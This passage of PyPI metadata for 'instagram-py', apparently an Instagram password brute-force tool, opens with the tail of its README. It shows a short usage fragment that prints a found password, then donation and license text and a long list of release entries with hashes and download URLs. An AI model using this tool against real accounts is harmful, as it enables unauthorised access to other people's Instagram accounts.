instagrampy.PasswordFound():\n<br>        print('Password Found: '+session.CurrentPassword())\n<br>\n<br> exit(0) \n<br> \n<br>\n<br>\n<br>=========\n<br>Support\n<br>=========\n<br>\n<br>If you think that this project is **cool** then you can give it a :star: or :fork_and_knife: it if you want to improve it with me. I really :heart: stars though!   \n<br>\n<br>.. raw:: html\n<br>\n<br> &lt;p align=\"center\"&gt;\n<br>     &lt;a href=\"https://liberapay.com/antonyjr/donate\"&gt;\n<br>        &lt;img src=\"https://liberapay.com/assets/widgets/donate.svg\"&gt;\n<br>     &lt;/a&gt;\n<br> &lt;/p&gt;\n<br>\n<br>\n<br>If you want to do something that stands out then you can click the **donate** button at the top to make a monthly donation , So   \n<br>I will make sure that I stay healthy and keep on to do my work. :briefcase: Supporting me means supporting all of my projects , So   \n<br>you are like **Tony Stark** :heart: who backs **Spider-Man**! Thank you for your extra care! :dog:   \n<br>\n<br>You can also tweet about me on twitter , get connected with me here -&gt; https://twitter.com/antonyjr0\n<br>\n<br>Thank You! :smiley_cat:\n<br>\n<br>\n<br>\n<br>=============\n<br>   License\n<br>=============\n<br>\n<br>The MIT License,\n<br>\n<br>Copyright (C) 2018 The Future Shell , Antony Jr.\n<br>\n          </div>"}, "last_serial": 3724840, "releases": {"0.2.1": [{"comment_text": "", "digests": {"md5": "66d33a482c1204e1e837a60c90226bfe", "sha256": "c43a03d6a77f5b95a822b39cd04a8dfa4bd2096b7cb4362f52f6d2e80eb587bf"}, "downloads": -1, "filename": "instagram-py-0.2.1.tar.gz", "has_sig": false, "md5_digest": "66d33a482c1204e1e837a60c90226bfe", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 15744, "upload_time": "2017-09-12T13:32:51", "upload_time_iso_8601": "2017-09-12T13:32:51.764604Z", "url": "https://files.pythonhosted.org/packages/98/c7/f5e9cd1124da5f632001861f2ae35b35220e923a9890197842413958d682/instagram-py-0.2.1.tar.gz", "yanked": false}], "0.3.1": [{"comment_text": "", "digests": {"md5": "09989a54d23908ad86bed3462713df38", "sha256": "424a55cd66754607ccae2ee0cd63c60961ab8829a112445ef7c2410f1f2ee452"}, "downloads": -1, "filename": "instagram-py-0.3.1.tar.gz", "has_sig": false, "md5_digest": "09989a54d23908ad86bed3462713df38", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 15805, "upload_time": "2017-09-12T13:38:46", "upload_time_iso_8601": "2017-09-12T13:38:46.644196Z", "url": "https://files.pythonhosted.org/packages/40/97/f81f9e2dc05cc54072f322b94c5cf35467c16d55c4c922064f29fa53c714/instagram-py-0.3.1.tar.gz", "yanked": false}], "0.3.2": [{"comment_text": "", "digests": {"md5": "93713a1184b28f8749206f8a91273154", "sha256": "8ca373fec6d94fb73351fae83297015fa213248e4d9a81eaccbd4e302d4decfe"}, "downloads": -1, "filename": "instagram-py-0.3.2.tar.gz", "has_sig": false, "md5_digest": "93713a1184b28f8749206f8a91273154", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 15896, "upload_time": "2017-09-13T09:29:00", "upload_time_iso_8601": "2017-09-13T09:29:00.798845Z", "url": "https://files.pythonhosted.org/packages/71/b4/365dd273628546e4bcf2971bdf0cde32544b08c6d3a2e0552d127f883329/instagram-py-0.3.2.tar.gz", "yanked": false}], "1.3.2": [{"comment_text": "", "digests": {"md5": "faccfd4780a0d073faef2bd73a3e9741", "sha256": "084125d49027d6f53807bbfa18e4c964d814491e4639acb2d19c731c97fbe81f"}, "downloads": -1, "filename": "instagram-py-1.3.2.tar.gz", "has_sig": false, "md5_digest": "faccfd4780a0d073faef2bd73a3e9741", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 22003, "upload_time": "2017-10-12T12:44:08", "upload_time_iso_8601": "2017-10-12T12:44:08.339853Z", "url": "https://files.pythonhosted.org/packages/f3/44/938f52c6f07d8c184d4a7dd253a6e631a8e5d0dedff91ad52c6bea89f173/instagram-py-1.3.2.tar.gz", "yanked": false}], "1.3.3": [{"comment_text": "", "digests": {"md5": "d7f9d8dcb9a5a970b8f391cbd19b14c1", "sha256": "c14357b6ba5cb4fdb99ef4efb54384127ee142fca29f9a6702c592449a3b8cbe"}, "downloads": -1, "filename": "instagram-py-1.3.3.tar.gz", "has_sig": false, "md5_digest": "d7f9d8dcb9a5a970b8f391cbd19b14c1", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 21997, "upload_time": "2017-10-12T12:55:04", "upload_time_iso_8601": "2017-10-12T12:55:04.872374Z", "url": "https://files.pythonhosted.org/packages/3c/2f/31e32b22233aa12852878a22e31c1786fdbf7c143ad4d4f29503da994631/instagram-py-1.3.3.tar.gz", "yanked": false}], "2.0.0": [{"comment_text": "", "digests": {"md5": "175148c9a7a5a82842173769318590a3", "sha256": "e08df7dfc1f0689e99b46d07880796b6d78f830910061c2ff7d514b96d3ea7e7"}, "downloads": -1, "filename": "instagram-py-2.0.0.tar.gz", "has_sig": false, "md5_digest": "175148c9a7a5a82842173769318590a3", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 24106, "upload_time": "2017-11-18T21:59:16", "upload_time_iso_8601": "2017-11-18T21:59:16.082082Z", "url": "https://files.pythonhosted.org/packages/f9/ec/b55e6ee87b9d93b225391a90334bf000362cededcc0a894956b0cd1e1e3f/instagram-py-2.0.0.tar.gz", "yanked": false}], "2.0.1": [{"comment_text": "", "digests": {"md5": "bb01efd6facf029e87f951eba9bedf90", "sha256": "924fb9c41b4a1cd00b040ced91cbda0a61cce975ad46f0945a43262868729cf4"}, "downloads": -1, "filename": "instagram-py-2.0.1.tar.gz", "has_sig": false, "md5_digest": "bb01efd6facf029e87f951eba9bedf90", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 27427, "upload_time": "2017-11-21T17:02:51", "upload_time_iso_8601": "2017-11-21T17:02:51.016383Z", "url": "https://files.pythonhosted.org/packages/87/85/bb6f950851546cd4509a654b6fca928b1546f6f3ba97471fb5e7545d9b05/instagram-py-2.0.1.tar.gz", "yanked": false}], "2.0.2": [{"comment_text": "", "digests": {"md5": "970eecfb484f4714baa2656e63854d62", "sha256": "36fddea0d25d54449006fb90330d5c0f1ab2981109f7c9d5df7a9f7ab9bd7301"}, "downloads": -1, "filename": "instagram-py-2.0.2.tar.gz", "has_sig": false, "md5_digest": "970eecfb484f4714baa2656e63854d62", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 25980, "upload_time": "2018-02-01T13:48:56", "upload_time_iso_8601": "2018-02-01T13:48:56.941439Z", "url": "https://files.pythonhosted.org/packages/f4/48/9840850c3a977a9f08db20792d39123df936781a2e55b1bfe9f4e6f2f08c/instagram-py-2.0.2.tar.gz", "yanked": false}], "2.0.3": [{"comment_text": "", "digests": {"md5": "bc210b7bae3e533e3cd330a2b6ba2058", "sha256": "816cd44012c27c1e70aeeec4bd83a0b1e43b0cd759b21dd11cd9148a314bb7c8"}, "downloads": -1, "filename": "instagram-py-2.0.3.tar.gz", "has_sig": false, "md5_digest": "bc210b7bae3e533e3cd330a2b6ba2058", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 25211, "upload_time": "2018-02-28T18:15:54", "upload_time_iso_8601": "2018-02-28T18:15:54.210582Z", "url": "https://files.pythonhosted.org/packages/be/1b/b96ee419a3e9874e68a5dcac727198508d8d0e754c4a4891cd9274d03b22/instagram-py-2.0.3.tar.gz", "yanked": false}], "2.0.4": [{"comment_text": "", "digests": {"md5": "4f38d826483f10dd4564499285ed2410", "sha256": "4f3aea4141ea0d979928fa01310405d67ccf6caa20721fbbbc28e2b86304382f"}, "downloads": -1, "filename": "instagram-py-2.0.4.tar.gz", "has_sig": false, "md5_digest": "4f38d826483f10dd4564499285ed2410", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 25220, "upload_time": "2018-02-28T18:22:09", "upload_time_iso_8601": "2018-02-28T18:22:09.311994Z", "url": "https://files.pythonhosted.org/packages/43/93/535b159beedc2adb558c7944528e269e0f72b48450872c36112f3ea87fd3/instagram-py-2.0.4.tar.gz", "yanked": false}], "2.0.5": [{"comment_text": "", "digests": {"md5": "7f0df08572fb559a47c847621c23acc0", "sha256": "d4687669cb0351fb7392213a8e280283fb0432d7fc097d673716d256e921367a"}, "downloads": -1, "filename": "instagram-py-2.0.5.tar.gz", "has_sig": false, "md5_digest": "7f0df08572fb559a47c847621c23acc0", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 29989, "upload_time": "2018-03-31T16:10:28", "upload_time_iso_8601": "2018-03-31T16:10:28.062137Z", "url": "https://files.pythonhosted.org/packages/80/a9/7f22e4b4dac4550305125fe33593d95817d9dc577db68423b7163b9019ab/instagram-py-2.0.5.tar.gz", "yanked": false}], "2.0.6": [{"comment_text": "", "digests": {"md5": "e05ea3ce8efb203937b8e5e532f5f606", "sha256": "269ac1cda6e0168a55f39c373a2787a1da3ba91526cf6d955a9938f6ed1844c3"}, "downloads": -1, "filename": "instagram-py-2.0.6.tar.gz", "has_sig": false, "md5_digest": "e05ea3ce8efb203937b8e5e532f5f606", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 29957, "upload_time": "2018-03-31T17:55:33", "upload_time_iso_8601": "2018-03-31T17:55:33.220296Z", "url": "https://files.pythonhosted.org/packages/58/7f/a3842321e821d8db51d79773f167b6d3957a030001cb216eb6fbce3e2351/instagram-py-2.0.6.tar.gz", "yanked": false}], "2.0.7": [{"comment_text": "", "digests": {"md5": "2e6a9ace844b6bc5b14465cabcd49a4d", "sha256": "8f9b3d7955de63eeea59fa8b0ac16e3a05bd272aa33538bea844ad738caa786c"}, "downloads": -1, "filename": "instagram-py-2.0.7.tar.gz", "has_sig": false, "md5_digest": "2e6a9ace844b6bc5b14465cabcd49a4d", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 31625, "upload_time": "2018-04-01T20:04:15", "upload_time_iso_8601": "2018-04-01T20:04:15.542958Z", "url": "https://files.pythonhosted.org/packages/c8/96/9a42a1f49c6710c52bffb474e6c966247cfabb3b0ec7f3a1f770d412444e/instagram-py-2.0.7.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "2e6a9ace844b6bc5b14465cabcd49a4d", "sha256": "8f9b3d7955de63eeea59fa8b0ac16e3a05bd272aa33538bea844ad738caa786c"}, "downloads": -1, "filename": "instagram-py-2.0.7.tar.gz", "has_sig": false, "md5_digest": "2e6a9ace844b6bc5b14465cabcd49a4d", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 31625, "upload_time": "2018-04-01T20:04:15", "upload_time_iso_8601": "2018-04-01T20:04:15.542958Z", "url": "https://files.pythonhosted.org/packages/c8/96/9a42a1f49c6710c52bffb474e6c966247cfabb3b0ec7f3a1f770d412444e/instagram-py-2.0.7.tar.gz", "yanked": false}], "timestamp": "Fri May  8 00:55:41 2020"}